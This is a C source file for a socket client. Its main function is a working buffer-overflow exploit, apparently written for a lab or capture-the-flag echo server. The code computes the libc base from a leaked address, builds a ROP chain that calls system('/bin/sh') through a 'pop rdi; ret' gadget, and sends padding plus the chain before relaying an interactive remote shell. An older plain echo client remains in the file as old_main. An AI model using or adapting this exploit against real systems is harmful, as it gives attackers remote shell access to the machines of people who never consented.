#include "deps.h"


int old_main(int argc, char const *argv[]) 
{ 
    int sock = 0; 
    struct sockaddr_in addr; 
    char * buffer;
    char * package;
    int n;
    char * port;
    char * ipaddr;
    setAddrInfo(argc, argv, port, ipaddr, &addr);

    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) 
    { 
        printf("\n Socket creation error \n"); 
        return -1; 
    }
       
    int continue_flag = 1;
    if(connect(sock, (struct sockaddr *)&addr, sizeof(addr)) ==  0){
        printf("Welcome to the Server!\n");
        while(continue_flag){
            printf("Type message to echo then hit enter, of 0 if you want to close the connection: ");
            myGetLine(&buffer, &n, stdin);
            printf("Sending message of %d bytes \n", n);
            send(sock , buffer, n , 0 ); 
            printf("Sent to server: %s ", buffer);
            printf("......\n");
            package = calloc(100, 1);
            package = read_message(5, sock, package);
            printf("Reply from Server: %s \n",package); 
            free(package);
            if((char) *buffer == '0'){
                continue_flag = 0;
            }
            free(buffer);
        }
    }
    return 0; 
} 

int main(int argc, char const *argv[]) 
{ 
    int sock = 0; 
    struct sockaddr_in addr; 
    char * buffer;
    char * package;
    int n;
    char * port;
    char * ipaddr;
    setAddrInfo(argc, argv, port, ipaddr, &addr);


    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) 
    { 
        printf("\n Socket creation error \n"); 
        return -1; 
    }
       
    int continue_flag = 1;
    if(connect(sock, (struct sockaddr *)&addr, sizeof(addr)) ==  0){
        //Read prologue of connection
        package = calloc(1000, 1);
        char* addr_str = strtok(read_message(5, sock, package), "\n");
        long int given_addr = strtol(addr_str, NULL, 0);
        //printf("Given Libc Addr: 0x%lx \n", given_addr);
        free(package);
        long int base_addr = given_addr - 4111520 ;
        long int bin_sh_offset = base_addr + 0x1b3e9a ;
        long int system_function_offset =  base_addr +  0x4f440;
        long int pop_rdi_ret_offset = base_addr + 0x000000000002155f;
        long int filler_rop = base_addr + 0x00000000000b17c5;
        char *payload = calloc(1000, 1);
        strcpy(payload, "almond ");
        int curr_end = strlen(payload);
        memset(payload + curr_end, 'A', 417);
        curr_end = strlen(payload);
        int payload_len = curr_end + 8 * 4; 
        strncpy(payload + curr_end, (char *)&filler_rop, 8);
        curr_end += 8; 
        strncpy(payload + curr_end, (char *)&pop_rdi_ret_offset, 8);
        curr_end += 8; 
        strncpy(payload + curr_end, (char *)&bin_sh_offset, 8);
        curr_end += 8; 
        strncpy(payload + curr_end, (char *)&system_function_offset, 8);
        curr_end += 8; 
        printf("Payload: \n %s \n", payload);
        printf("Sending Payload \nBegin Interactive \n");
        send(sock , payload, payload_len , 0 ); 
        free(payload);
        while(1){
            myGetLine(&buffer, &n, stdin);
            send(sock, buffer, n , 0 ); 
            package = calloc(1000, 1);
            package = read_message(5, sock, package);
            printf("%s ",package); 
            free(buffer);
            free(package);
        }
        /*
        myGetLine(&buffer, &n, stdin);
        printf("Sending message of %d bytes \n", n);
        send(sock , buffer, n , 0 ); 
        printf("Sent to server: %s ", buffer);
        printf("......\n");
        package = calloc(100, 1);
        package = read_message(5, sock, package);
        printf("Reply from Server: %s \n",package); 
        free(buffer);
        */
    }
    return 0; 
} 
